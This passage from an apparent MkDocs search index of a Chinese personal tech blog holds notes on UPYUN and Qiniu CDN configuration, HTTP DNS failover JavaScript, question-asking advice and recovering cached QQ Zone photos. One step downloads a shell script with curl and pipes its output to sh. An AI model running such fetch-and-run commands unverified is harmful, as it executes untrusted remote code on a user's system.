\u5b58\u50a8\u4e86DNS\u7684TTL\u7ed3\u679c\uff0c\u5982\u679cTTL\u5df2\u7ecf\u8fc7\u671f\u5c31\u518d\u6b21\u67e5\u8be2\uff08\u6240\u4ee5\u4e0a\u9762\u7f13\u5b58\u4e00\u5468\u5176\u5b9e\u6ca1\u7528\uff0cTTL\u4e00\u822c\u5c3110\u5206\u949f\uff09 \u53c2\u8003\uff1a https://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript https://stackoverflow.com/questions/92720/jquery-javascript-to-replace-broken-images \u4f9d\u8d56lscache: https://github.com/pamelafox/lscache var cdnupdating = false ; function updatecdn ( cb ){ if ( cdnupdating ) return ; cdnupdating = true ; $. get ( \"https://203.107.1.1/100000/d?host=www.aliyun.com\" , null , function ( data ){ var ip = data . ips [ 0 ]; var domain = ip . replace ( / \\ ./ g , \"-\" ) + \".xip.example.com\" ; var ddl = new Date () / 1000 + data . ttl ; var cdn = { domain : domain , ddl : ddl }; lscache . set ( 'cdn' , cdn , 604800 ); if ( cb ) cb ( cdn ); }); } function fixbrokenimages ( cdn ){ if ( ! cdn ) cdn = lscache . get ( \"cdn\" ); if ( ! cdn || cdn . ddl < + new Date () / 1000 ) return updatecdn ( fixbrokenimages ); $ ( 'img[src*=\"www.aliyun.com\"]' ) . each ( function () { if ( ! this . complete || typeof this . naturalWidth == \"undefined\" || this . naturalWidth == 0 ) { this . src = this . src . replace ( \"www.aliyun.com\" , cdn . domain ); } }); } var fixbrokenimages_timer = null ; function image_onerror (){ // console . log ( \"image_onerror\" , this . src ); if ( /.* www . aliyun . com .*/. test ( this . src )){ fixbrokenimages (); } if ( ! fixbrokenimages_timer ){ fixbrokenimages_timer = setInterval ( fixbrokenimages , 1000 ); } } $ ( 'img[src*=\"www.aliyun.com\"]' ) . on ( 'error' , image_onerror );","title":"CDN"},{"location":"CDN/#cdn","text":"","title":"CDN"},{"location":"CDN/#upyun","text":"","title":"UPYUN"},{"location":"CDN/#_1","text":"","title":"\u4e0a\u4f20\u6587\u4ef6\u7684\u65b9\u6cd5"},{"location":"CDN/#ftp","text":"\u4eba\u5bb6\u652f\u6301\u7528ftp\u4f20\u8f93\u6587\u4ef6\uff0c\u800c\u4e14\u7528ftp\u4f3c\u4e4e\u4e0d\u5bf9\u6d41\u91cf\u8ba1\u8d39 ftp://v0.ftp.upyun.com \u7528\u6237\u540d\u662f\u201d\u64cd\u4f5c\u5458\u540d/\u670d\u52a1\u540d\u201d\uff08\u5176\u4e2d/\u5b57\u7b26\u662f\u7528\u6237\u540d\u7684\u4e00\u90e8\u5206\uff09,\u5bc6\u7801\u4e3a\u201d\u64cd\u4f5c\u5458\u5bc6\u7801\u201d \u6709\u4e9b\u65f6\u5019\u4f60\u9700\u8981\u5bf9\u5176\u4e2d\u7684/\u8fdb\u884curlencode\uff0c\u9700\u8981\u7528 %2F \uff08\u4f60\u53ef\u4ee5\u4f7f\u7528Python\u7684 quote(\"/\", \"\") \u6765\u67e5\u8be2\uff09","title":"FTP"},{"location":"CDN/#curlftpfs","text":"\u57fa\u4e8e\u4e0a\u8ff0\u7684ftp\uff0c\u5728\u8fd9\u79cd\u60c5\u5883\u4e0b\u53ef\u9760\u6027\u4e0d\u9ad8\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528 http://curlftpfs.sourceforge.net/ \u6ce8\u610f\u547d\u4ee4\u4e2d\u7684 ftp://\u7528\u6237\u540d:\u5bc6\u7801@v0.ftp.upyun.com \u5176\u4e2d\u7684\u7528\u6237\u540d\u7684/\u7b26\u53f7\u9700\u8981\u6539\u4e3a%2f","title":"curlftpfs"},{"location":"CDN/#upyunmanager","text":"https://github.com/layerssss/manager-for-upyun","title":"UpyunManager"},{"location":"CDN/#upyun-python","text":"\u6bd4\u5982\u672cblog\u8bbe\u7f6e\u4e86\u7f13\u5b58\u6240\u6709html\u4e00\u5e74\u6765\u51cf\u5c11\u56de\u6e90github\u7684\u6b21\u6570\uff0c\u5728\u6bcf\u6b21\u6211\u66f4\u65b0\u540e\u5c31\u5237\u65b0\u4e00\u6b21\u7f13\u5b58 \u89c4\u5219\u5237\u65b0\uff1a https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun URL\u5237\u65b0\u4e5f\u662f\u540c\u7406\uff1a \u5b98\u65b9\u6587\u6863\uff1ahttp://docs.upyun.com/api/purge/ \u6211\u7684\u4ee3\u7801upyun_purge.py \u6ce8\u610f\u64cd\u4f5c\u5458\u8981\u88ab\u6388\u6743\uff1b\u8c03\u7528API\u6b63\u5e38\u7684\u8fd4\u56de\u503c\u5c31\u662f {'invalid_domain_of_url': {}} \uff0c\u4e0d\u8981\u770b\u5230invalid\u5c31\u4ee5\u4e3a\u51fa\u9519\u4e86hhh","title":"UPYUN Python\u6267\u884c\u7f13\u5b58\u5237\u65b0"},{"location":"CDN/#upyunwebp","text":"\u73b0\u5728\u5df2\u7ecf\u6709\u914d\u7f6e\uff0c\u542f\u7528\u540e\u81ea\u52a8\u6839\u636e\u7528\u6237\u7684\u6d4f\u89c8\u5668Accept\u81ea\u52a8\u8fd4\u56dewebp\uff0c\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c \u4e4b\u524d\u7684\u65b9\u6848\uff1a\u65e0\u9700\u4ee3\u7801\uff0c\u53ea\u9700\u8981\u5728\u539f\u56fe\u540e\u9762\u52a0\u4e0a !/format/webp \u5373\u53ef\uff0c\u5047\u8bbe\u5df2\u7ecf\u5728\u4f7f\u7528\u81ea\u5b9a\u4e49\u56fe\u7247\u683c\u5f0f\uff0c\u4f8b\u5982 !compress \u5219\u53d8\u4e3a !compress/format/webp \u53ef\u4ee5\u8fdb\u4e00\u6b65\u8282\u7701\u6d41\u91cf \u5b98\u65b9\u8bf4\u660e\uff1a https://www.upyun.com/webp.html","title":"\u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf"},{"location":"CDN/#404","text":"\u672c\u7ad9\u539f\u7248\u4f7f\u7528\u7684Jekyll\u5c06xxx.md\u7f16\u8bd1\u4e3axxx.html\uff0c\u73b0\u5728\u6539\u7528MkDocs\u540exxx.md\u7f16\u8bd1\u5f97\u5230\u7684\u662fxxx/index.html\uff0c\u539f\u5148\u7684\u94fe\u63a5\u5c31404\u4e86 \u53c8\u62cd\u4e91\u80fd\u914d\u7f6e\u8fb9\u7f18\u89c4\u5219 \u8fdb\u884cURL\u6539\u5199\uff0c\u7528\u6237\u5728\u8bbf\u95eexxx.html\u7684\u65f6\u5019\u5b9e\u9645\u56de\u6e90xxx/ \u800c\u4e14\u914d\u7f6e\u633a\u7b80\u5355\uff0c\u53ea\u8981\u4f1a\u5199\u6b63\u5219\u5373\u53ef \u914d\u7f6e\u89c4\u5219\u5982\u4e0b\uff1a \u6761\u4ef6\u5224\u65ad\uff1a \u5982\u679c\u8bf7\u6c42URI \u6b63\u5219\u5339\u914d ^/[^/]*html$ \u529f\u80fd\u9009\u62e9\uff1a URL\u6539\u5199 URI \u5b57\u7b26\u4e32\u63d0\u53d6\uff1a ^/([^/]*).html$ \u6539\u5199\u89c4\u5219\uff1a/$1/ break: \u6253\u52fe","title":"\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898"},{"location":"CDN/#upyun-upyun-token","text":"\u60f3\u53ea\u5bf9\u7279\u5b9aurl\u4f7f\u7528token\u53cd\u76d7\u94fe\uff0c\u4e8e\u662f\u5c31\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u6765\u5b9e\u73b0\u4e00\u4e0b\u5b8c\u5168\u517c\u5bb9\u53cd\u76d7\u94fe\u7684\u7b97\u6cd5\u54af \u53d1\u73b0\u4e00\u4e2a\u5751\uff1a\u53c8\u62cd\u4e91\u7684\u8fb9\u7f18\u89c4\u5219\u7684 $SUB \u51fd\u6570 \u5176from\u548cto\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\uff0c\u5305\u62ecfrom\uff0c\u4e5f\u5305\u62ecto URI \u5b57\u7b26\u4e32\u63d0\u53d6\u4e0d\u586b\uff0cbreak\u4e0d\u9009\uff0c\u89c4\u5219\u7f16\u8f91\u5668\u586b\u4ee5\u4e0b\u5185\u5bb9 $WHEN($MATCH($_URI, '\u8fd9\u91cc\u586bURI\u5339\u914d\u6b63\u5219'),$OR($GT($_TIME, $SUB($_GET__upt, 9,99)),$NOT($_GET__upt), $NOT($EQ($SUB($MD5('\u8fd9\u91cc\u586bTOKEN''&'$SUB($_GET__upt, 9,99)'&'$_URI),13,20),$SUB($_GET__upt, 1,8)))))$EXIT(403)","title":"UPYUN \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd"},{"location":"CDN/#upyun-https","text":"\u4f7f\u7528F12\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u770b\u7684\u63a5\u53e3\uff0c\u7528Python\u5b9e\u73b0\u4e86\u4e00\u4e0b\uff0c\u4ece\u624b\u52a8\u4e00\u4e2a\u4e2a\u6dfb\u52a0\u8bc1\u4e66\u4e2d\u89e3\u653e\u51fa\u6765 https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun/","title":"UPYUN https\u8bc1\u4e66\u66f4\u65b0"},{"location":"CDN/#upyun_1","text":"\u5728\u529f\u80fd\u914d\u7f6e-\u5b58\u50a8\u7ba1\u7406\u9875\u9762\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u5bc6\u94a5\uff0c \u5b98\u65b9\u5e2e\u52a9\u6587\u6863 \u8fc7\u4e8e\u5206\u6563\uff0c\u8fd9\u91cc\u6574\u7406\u4e00\u4e0b\u5fc5\u987b\u7684\u6b65\u9aa4 \u9700\u6c42\uff1a\u7b80\u5355\u7684\u5141\u8bb8\u4e0a\u4f20\u4e00\u4e2a\u56fa\u5b9a\u6587\u4ef6\u540d\u7684\u6587\u4ef6\uff0c\u4e0d\u8981\u8fc7\u671f \u9996\u5148\u5199\u4e00\u4e2a\u4e0a\u4f20\u7b56\u7565policy\uff0c\u7136\u540e\u5bf9\u5b83base64\uff0c\u548c\u5bc6\u94a5\u7528&\u62fc\u63a5\u540e\u8ba1\u7b97md5 \u8fd9\u4e2a\u811a\u672c\u5c06\u8f93\u51fa\u53d8\u91cf\u5b9a\u4e49\u548ccurl\u547d\u4ee4\uff0c\u4fbf\u4e8e\u590d\u5236\u4f7f\u7528 key = 'AAA...AAA' bucket = 'demobucket' filename = 'img.jpg' filepath = \"/ ${ filename } \" policy = '{\"bucket\":\"' ${ bucket } '\",\"expiration\":9999999999,\"save-key\":\"' ${ filepath } '\"}' b64_policy = ` echo -n $policy | base64 -w0 ` echo UPYUN_POLICY = ${ b64_policy } echo UPYUN_SIGN = $( echo -n \" ${ b64_policy } & ${ key } \" | md5sum | awk '{print $1}' ) echo \"curl https://v0.api.upyun.com/ ${ bucket } -F file=@ ${ filename } -F policy=\\${UPYUN_POLICY} -F signature=\\${UPYUN_SIGN}\" \u6211\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u811a\u672c\u4fbf\u4e8e\u4f60\u5feb\u901f\u8c03\u7528\uff1a curl - O d . py3 . io / up . sh sh up . sh key bucket filename # \u89e6\u53d1\u4e0a\u4f20\u53ea\u8981\u7ee7\u7eed\u4e22\u7ed9 sh\u5c31\u884c sh up . sh key bucket filename | sh","title":"UPYUN \u8868\u5355\u4e0a\u4f20\u600e\u4e48\u7528"},{"location":"CDN/#upyun61","text":"\u867d\u7136\u4eba\u5bb6 \u8ba1\u8d39\u8bf4\u660e \u5199\u7684\u662f \u52a8\u6001\u8bf7\u6c42\u662f\u6307\u56de\u7528\u6237\u6e90\u7ad9\u5e76\u4e14\u7f13\u5b58\u65f6\u95f4\u5c0f\u4e8e 60 \u79d2\u6216\u8005\u6307\u5b9a\u4e0d\u7f13\u5b58\u7684\u8bf7\u6c42\u3002 \u4f46\u4ece\u5b9e\u9645\u7684\u8bbf\u95ee\u65e5\u5fd7\u6765\u770b\uff0c\u7f13\u5b5860\u79d2\u662f\u4e0d\u591f\u7684\uff0c\u5fc5\u987b\u7f13\u5b5861\u79d2\u624d\u5f53\u6210\u9759\u6001\u8bf7\u6c42 \u9700\u8981\u8fdb\u884c\u7684\u4ee3\u7801\u53d8\u52a8: \u5b50\u57df\u540d+\u76f4\u63a5\u89e3\u6790\u5230\u6e90\u7ad9+\u8de8\u57df\u8bf7\u6c42+\u4e00\u4e2a\u83b7\u53d6cookie\u7684\u8def\u7531 \u6ce8\u610f\u5230\u6211\u4eec\u628a\u7f51\u9875\u672c\u8eab\u90fd\u7f13\u5b58\u4e86\uff0c\u6240\u4ee5 \u7f51\u9875\u6e90\u4ee3\u7801\u672c\u8eab\u4e0d\u80fd\u6709\u7528\u6237\u76f8\u5173\u7684\u5185\u5bb9 \u7528\u6237\u767b\u5f55\u72b6\u6001\u53ef\u4ee5\u5b58\u5728cookie\u91cc \u6307\u5b9adomain\u7684\u65b9\u5f0f\u8ba9\u5b50\u57df\u540d\u4e5f\u80fd\u83b7\u53d6 \u7f13\u5b5861\u79d2\uff0c\u4e00\u822c\u7528\u6237\u8fd8\u662f\u80fd\u89e6\u53d1MISS\uff0c\u4ea7\u751f\u4e00\u6b21\u56de\u6e90\u8bbe\u7f6e\u597dcookie \u4f46\u5982\u679c\u7528\u6237\u8bbf\u95ee\u7684\u5168\u90e8\u662f\u7f13\u5b58\u9875\u9762\uff0c\u524d\u7aef\u4ee3\u7801\u9700\u8981\u5148\u5224\u65adcookie\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5c31\u9700\u8981\u53d1\u8d77getsession\u8bf7\u6c42\u6765\u83b7\u53d6cookie\u518d\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42 \u8fd9\u79cd\u8de8\u57df\u9700\u8981\u5e26\u4e0aCookie\u6240\u4ee5\u662fwithCredential\u7684 \u524d\u7aefjs: function queryme(){ $.ajax({ url:\"https://subdomain.www.example.com/uri\", success:function(data){ //... }, xhrFields:{withCredentials:true} }) } (function(){ if(document.cookie.indexOf(\"user=\")>=0){ queryme(); }else{ $.get(\"/getsession\",null,queryme); } })(); \u540e\u7aefNginx: add_header 'Access-Control-Allow-Origin' 'https://www.example.com'; add_header 'Access-Control-Allow-Credentials' 'true';","title":"UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42"},{"location":"CDN/#qiniu","text":"","title":"Qiniu"},{"location":"CDN/#qshell","text":"qshell qupload [ < ThreadCount > ] < LocalUploadConfig > \u9700\u8981\u5199\u4e00\u4e2aconfig\u6587\u4ef6\uff0c\u5177\u4f53\u53c2\u89c1\u5b98\u65b9\u6587\u6863 https://developer.qiniu.com/kodo/tools/1302/qshell https://github.com/qiniu/qshell/wiki/qupload","title":"\u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939"},{"location":"CDN/#dnshttp-dnscdn","text":"\u60c5\u5f62\uff1a\u7528\u6237\u7684DNS\u4e0d\u9760\u8c31\uff0c\u4e0d\u9075\u5faaCDN DNS\u7684TTL\u8bbe\u7f6e\uff0c\u5bfc\u81f4\u7528\u6237\u5f97\u5230\u7684\u8282\u70b9IP\u5df2\u7ecf\u8fc7\u671f\u5931\u6548\uff0c\u5bfc\u81f4\u7f51\u7ad9\u4e0a\u7684\u56fe\u7247\u65e0\u6cd5\u52a0\u8f7d \u89e3\u51b3\u65b9\u6848\uff1a\u4f7f\u7528 \u963f\u91cc\u4e91\u7684HTTP DNS (\u652f\u6301HTTPS\u8bf7\u6c42)\uff0c\u7f51\u9875\u7aef\u8bbf\u95ee\u56fe\u7247\u65f6\u5982\u679c\u51fa\u9519\u66ff\u6362\u4e3a \u6307\u5b9aIP\u7684CDN\u8282\u70b9","title":"\u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9"},{"location":"CDN/#http-dns","text":"\u6309\u7167\u6587\u6863\u64cd\u4f5c\u5373\u53ef\uff1a https://help.aliyun.com/document_detail/30113.html \u6ce8\u610f\u5230\u76ee\u524d https://203.107.1.33 \u4f1a\u8bc1\u4e66\u9519\u8bef\uff0c\u6539\u7528 https://203.107.1.1 \u5373\u53ef \u8fd9\u4e2a\u63a5\u53e3\u652f\u6301\u8de8\u57df\u8bf7\u6c42\uff1a $. get ( \"https://203.107.1.1/100000/d?host=www.aliyun.com\" , null , function ( data ){ var ip = data . ips [ 0 ]; console . log ( ip ); });","title":"HTTP DNS\u63a5\u5165"},{"location":"CDN/#_2","text":"\u53c2\u8003 sslip.io \u5047\u8bbe\u6211\u4eec\u6709\u5df2\u7ecf\u5907\u6848\u7684\u57df\u540d example.com \uff0c\u4f7f\u7528 xip.example.com \u4f5c\u4e3a\u6cdb\u57df\u540d\u89e3\u6790\u7684\u57df\u540d\uff0c\u4e5f\u5c31\u662f\u8bf4 140-205-34-3.xip.example.com \u5c31\u4f1a\u89e3\u6790\u5230 140.205.34.3 \u53ea\u9700\u8981\u8bbe\u7f6e4\u6761NS\u8bb0\u5f55\u5373\u53ef\uff1a ns-aws.nono.io ns-gce.nono.io ns-azure.nono.io ns-vultr.nono.io","title":"\u6cdb\u57df\u540d\u89e3\u6790"},{"location":"CDN/#https","text":"\u53c2\u89c1\uff1a https://py3.io/Nginx/#acmesh","title":"\u7533\u8bf7\u6cdb\u57df\u540d\u7684https\u8bc1\u4e66"},{"location":"CDN/#cdn_1","text":"\u5c06\u6cdb\u57df\u540d\u7ed1\u5b9a\u5230CDN\u670d\u52a1\u4e0a\uff0c\u5e76\u63d0\u4f9b\u7533\u8bf7\u5230\u7684HTTPS\u8bc1\u4e66\uff0c\u5f00\u542fHTTPS\u8bbf\u95ee","title":"\u914d\u7f6eCDN"},{"location":"CDN/#js","text":"\u4e0b\u8ff0\u4ee3\u7801\u51fa\u9519\u65f6\u5c06\u628a\u56fe\u7247src\u7684 www.aliyun.com \u66ff\u6362\u4e3a 1-2-3-4.xip.example.com \uff0c\u7279\u70b9\uff1a \u53ea\u8981\u4e00\u5f20CDN\u7684\u56fe\u7247\u5df2\u7ecf\u51fa\u9519\u5c31\u4f1a\u5f00\u59cb\u66ff\u6362\u6240\u6709\u574f\u56fe \u4e0d\u4f1a\u66ff\u6362\u5df2\u7ecf\u6210\u529f\u52a0\u8f7d\u7684\u56fe\u7247 \u4f7f\u7528localStorage\u7f13\u5b58HTTP DNS\u7684\u67e5\u8be2\u7ed3\u679c \u7f13\u5b58\u4e00\u5468 \u5b58\u50a8\u4e86DNS\u7684TTL\u7ed3\u679c\uff0c\u5982\u679cTTL\u5df2\u7ecf\u8fc7\u671f\u5c31\u518d\u6b21\u67e5\u8be2\uff08\u6240\u4ee5\u4e0a\u9762\u7f13\u5b58\u4e00\u5468\u5176\u5b9e\u6ca1\u7528\uff0cTTL\u4e00\u822c\u5c3110\u5206\u949f\uff09 \u53c2\u8003\uff1a https://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript https://stackoverflow.com/questions/92720/jquery-javascript-to-replace-broken-images \u4f9d\u8d56lscache: https://github.com/pamelafox/lscache var cdnupdating = false ; function updatecdn ( cb ){ if ( cdnupdating ) return ; cdnupdating = true ; $. get ( \"https://203.107.1.1/100000/d?host=www.aliyun.com\" , null , function ( data ){ var ip = data . ips [ 0 ]; var domain = ip . replace ( / \\ ./ g , \"-\" ) + \".xip.example.com\" ; var ddl = new Date () / 1000 + data . ttl ; var cdn = { domain : domain , ddl : ddl }; lscache . set ( 'cdn' , cdn , 604800 ); if ( cb ) cb ( cdn ); }); } function fixbrokenimages ( cdn ){ if ( ! cdn ) cdn = lscache . get ( \"cdn\" ); if ( ! cdn || cdn . ddl < + new Date () / 1000 ) return updatecdn ( fixbrokenimages ); $ ( 'img[src*=\"www.aliyun.com\"]' ) . each ( function () { if ( ! this . complete || typeof this . naturalWidth == \"undefined\" || this . naturalWidth == 0 ) { this . src = this . src . replace ( \"www.aliyun.com\" , cdn . domain ); } }); } var fixbrokenimages_timer = null ; function image_onerror (){ // console . log ( \"image_onerror\" , this . src ); if ( /.* www . aliyun . com .*/. test ( this . src )){ fixbrokenimages (); } if ( ! fixbrokenimages_timer ){ fixbrokenimages_timer = setInterval ( fixbrokenimages , 1000 ); } } $ ( 'img[src*=\"www.aliyun.com\"]' ) . on ( 'error' , image_onerror );","title":"\u524d\u7aefJS"},{"location":"Developer/","text":"\u4fdd\u6301\u6280\u672f\u7cbe\u8fdb \u00b6 \u5148\u5f97\u6709\u65b9\u5411\uff0c\u6211\u7528\u8fd9\u4e2a\u6280\u672f\u80fd\u7ed9\u6211\u5e26\u6765\u4ec0\u4e48\u56de\u62a5\uff1f\u627e\u5230\u5185\u5728\u52a8\u529b \u8bfb\u4e66\uff0c\u5b66\u4e60\u89c6\u9891\u8bfe\u7a0b \u53bb\u9605\u8bfb\u6e90\u7801\uff0c\u5927\u7684\u5f00\u6e90\u9879\u76ee\u6709\u65b0\u7684\u6280\u672f\u3001\u5de7\u5999\u7684\u8bbe\u8ba1\u3001\u4f18\u826f\u7684\u67b6\u6784\uff0c\u5bf9\u81ea\u5df1\u5199\u4ee3\u7801\u3001\u67b6\u6784\u7684\u80fd\u529b\u90fd\u6709\u975e\u5e38\u5927\u7684\u63d0\u5347 \u5728\u9879\u76ee\u4e2d\u4f7f\u7528\u81ea\u5df1\u60f3\u7528\u7684\u6280\u672f\uff0c\u89e3\u51b3\u73b0\u5b9e\u95ee\u9898 \u52a0\u5165\u5f00\u6e90\u9879\u76ee\uff0c\u548c\u725b\u4eba\u4e00\u8d77\u5de5\u4f5c\uff0c\u5411\u725b\u4eba\u770b\u9f50 \u52a0\u5165\u9ad8\u624b\u7684\u793e\u7fa4\uff0c\u4e0e\u4f18\u79c0\u7684\u4eba\u5728\u4e00\u8d77 \u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee \u00b6 From: https://z.codes/how-to-ask-computer-question/ \u7b80\u77ed\u7248 \u00b6 \u6211\u73b0\u5728\u9047\u5230\u4e00\u4e2a\u95ee\u9898X \u6211\u60f3\u5230\u53ef\u80fd\u7684\u539f\u56e0\u662fa, b, c \u6211\u6392\u9664\u4e86\u4ee5\u4e0b\u53ef\u80fd\u6027d, e, f \u6211\u5c1d\u8bd5\u8fc7\u4ee5\u4e0b\u65b9\u6848g, h, i \u8bf7\u95ee\u8fd8\u6709\u4ec0\u4e48\u662f\u6211\u9057\u6f0f\u7684? \u9996\u5148\u4f60\u9700\u8981\u660e\u767d \u00b6 \u7a0b\u5e8f\u5458\u4eec\u53ea\u504f\u7231\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u6216\u8005\u80fd\u6fc0\u53d1\u4ed6\u4eec\u601d\u7ef4\u7684\u597d\u95ee\u9898 \u5bf9\u65b9\u6ca1\u6709\u4e49\u52a1\u5fcd\u8010\u4f60\u7684\u65e0\u77e5\u548c\u61d2\u60f0 \u5468\u5168\u7684\u601d\u8003\uff0c\u51c6\u5907\u597d\u4f60\u7684\u95ee\u9898\uff0c\u8349\u7387\u7684\u53d1\u95ee\u53ea\u80fd\u5f97\u5230\u8349\u7387\u7684\u56de\u7b54\uff0c\u6216\u8005\u6839\u672c\u5f97\u4e0d\u5230\u4efb\u4f55\u7b54\u6848 \u63d0\u95ee\u4e4b\u524d \u00b6 \u7528\u4e2d \u82f1\u6587 \u8fdb\u884c Google , \u7ffb\u524d\u4e24\u9875\u7684\u7ed3\u679c, \u5f80\u5f80Stack Overflow\u7f51\u7ad9\u4e0a\u7684\u7b54\u6848\u5c31\u662f\u6b63\u786e\u7b54\u6848. \u5982\u679c\u6ca1\u6709\u627e\u5230, \u66f4\u6362\u53ef\u80fd\u7684\u5173\u952e\u8bcd\u591a\u6b21\u5c1d\u8bd5 \u5728FAQ/\u6587\u6863\u91cc\u627e\u7b54\u6848, \u8010\u5fc3\u8bfb\u82f1\u6587\u6587\u6863\u662f\u57fa\u672c\u7d20\u517b \u53d1\u95ee\u7684\u5f62\u5f0f \u00b6 \u4f7f\u7528\u8a00\u7b80\u610f\u8d45\uff0c\u63cf\u8ff0\u51c6\u786e\u7684\u6807\u9898 \u7cbe\u786e\u63cf\u8ff0, \u4fe1\u606f\u91cf\u5927, \u4f46\u662f\u4e0d\u5570\u55e6 \u5c3d\u53ef\u80fd\u8be6\u7ec6\u800c\u660e\u786e\u7684\u63cf\u8ff0\u75c7\u72b6 \u63d0\u4f9b\u95ee\u9898\u53d1\u751f\u7684\u73af\u5883\uff08\u673a\u5668\u914d\u7f6e\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7a0b\u5e8f\u4ee5\u53ca\u522b\u7684\u4ec0\u4e48\uff09 \u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u662f\u600e\u6837\u53bb\u7814\u7a76\u548c\u7406\u89e3\u8fd9\u4e2a\u95ee\u9898\u7684 \u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u91c7\u53d6\u4e86\u4ec0\u4e48\u6b65\u9aa4\u53bb\u89e3\u51b3\u5b83 \u5728\u81ea\u5df1\u7684\u5c1d\u8bd5\u4e2d, \u6392\u9664\u4e86\u54ea\u4e9b\u53ef\u80fd\u7684\u539f\u56e0 \u7f57\u5217\u6700\u8fd1\u505a\u8fc7\u4ec0\u4e48\u53ef\u80fd\u6709\u5f71\u54cd\u7684\u786c\u4ef6\u3001\u8f6f\u4ef6\u53d8\u66f4 \u5c3d\u91cf\u60f3\u8c61\u4e00\u4e2a\u7a0b\u5e8f\u5458\u4f1a\u600e\u6837\u53cd\u95ee\u4f60\uff0c\u5728\u63d0\u95ee\u7684\u65f6\u5019\u9884\u5148\u7ed9\u4ed6\u7b54\u6848 \u5bf9\u6bcf\u4e00\u4e2a\u5173\u952e\u6b65\u9aa4\u622a\u56fe, \u5982\u679c\u6709\u9519\u8bef\u4fe1\u606f, **\u622a\u56fe\u548c\u6587\u5b57\u7248**\u8fde\u540c\u4ea7\u751f\u95ee\u9898\u7684**\u4ee3\u7801**\u90fd\u8981\u53d1\u7ed9\u5bf9\u65b9 \u7ed9\u51fa\u81ea\u5df1\u51fa\u95ee\u9898\u7684\u4ee3\u7801, \u5fc5\u987b\u662f\u5bf9\u65b9\u590d\u5236\u540e\u5c31\u80fd\u7acb\u5373\u8fd0\u884c, \u5e76\u4e14\u590d\u73b0\u95ee\u9898\u7684\u6700\u7b80\u4ee3\u7801. \u5220\u53bb\u4e0e\u95ee\u9898\u65e0\u5173\u7684\u90e8\u5206 \u522b\u95ee\u5e94\u8be5\u81ea\u5df1\u89e3\u51b3\u7684\u95ee\u9898, \u907f\u514d\u65e0\u610f\u4e49\u7684\u7591\u95ee \u95ee\u9898\u89e3\u51b3\u540e \u00b6 \u7b80\u77ed\u8bf4\u660e\u81ea\u5df1\u662f\u5982\u4f55\u89e3\u51b3\u7684, \u540e\u7eed\u5c1d\u8bd5\u7684\u8fc7\u7a0b \u5982\u679c\u522b\u4eba\u5bf9\u4f60\u6709\u5e2e\u52a9, \u611f\u8c22\u4e00\u4e0b\u5bf9\u65b9, \u6bd4\u5982\u53d1\u4e2a\u7ea2\u5305\u4ec0\u4e48\u7684 \u9644\u52a0 \u00b6 \u53c2\u8003 \u00b6 \u7535\u8111\u51fa\u73b0\u6545\u969c\uff0c\u5982\u4f55\u6b63\u786e\u5730\u63d0\u95ee https://vjudge1.github.io/2015/07/01/how-to-ask.html \u4f60\u4f1a\u95ee\u95ee\u9898\u5417 http://coolshell.cn/articles/3713.html \u300a\u63d0\u95ee\u7684\u827a\u672f\uff1a\u5982\u4f55\u5feb\u901f\u83b7\u5f97\u7b54\u6848\u300b\uff08\u7cbe\u8bfb\u7248\uff09 http://bbs.csdn.net/topics/390307835 \u672c\u6587\u7684\u56fe\u7247\u7248 \u00b6 (\u65b9\u4fbf\u5728\u804a\u5929\u5de5\u5177\u91cc\u7529\u7ed9\u5bf9\u65b9): \u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247 \u00b6 \u770b\u5230\u6709\u597d\u53cb\u79c0\u6069\u7231\uff0c\u7136\u540e\u5c31\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u4e86\uff0c\u4f46\u6253\u5f00\u8fc7\u7684\u56fe\u7247\u6709chrome\u7f13\u5b58\uff0c\u4e8e\u662f\u4fbf\u5c1d\u8bd5\u4ece\u7f13\u5b58\u627e\u5230\u56fe\u7247url chrome\u7684\u7f13\u5b58\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a chrome://cache/ \u7136\u540e\u968f\u610f\u70b9\u5f00\u4e00\u5f20qq\u7a7a\u95f4\u7684\u56fe\u7247\uff0c\u53d1\u73b0\u5176\u5305\u542bpsb\uff08\u6bd5\u7adf\u53f3\u952e\u4fdd\u5b58\u7684\u6587\u4ef6\u540d\u9ed8\u8ba4\u5c31\u662fpsb\uff09\uff0c\u7136\u540e\u5c31\u662f\u641c\u7d22\u54af \u5728\u70b9\u8fdb\u53bb\u7684\u7f13\u5b58\u9875\u9762\u53ef\u4ee5F12\u6267\u884cjs\uff0c\u67e5\u770b\u7f13\u5b58\u56fe\u7247\uff1a \u4ee3\u7801\u6765\u6e90\uff1ahttp://www.sensefulsolutions.com/2012/01/viewing-chrome-cache-easy-way.html ( function () { var preTags = 